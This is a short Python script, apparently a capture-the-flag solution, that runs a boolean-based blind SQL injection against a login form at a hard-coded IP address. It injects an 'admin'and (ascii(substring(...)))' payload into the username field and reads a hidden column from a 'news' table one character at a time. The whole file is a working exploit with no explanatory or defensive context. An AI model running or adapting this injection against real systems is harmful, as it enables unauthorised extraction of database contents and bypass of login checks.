import requests
import string
url='http://118.190.152.202:8011/'
r=requests.session()
string_=string.digits+string.ascii_letters
name=''
for i in range(1,100):
    for j in  range(37,127):
        payload="admin'and (ascii(substring((select kjafuibafuohnuvwnruniguankacbh from news),{0},1))={1})#"
        post={'username':payload.format(i,j),'password':'sadfsd'}
        html=r.post(url,data=post)
        if 'normal' in html.text:
            name+=chr(j)
            print(name)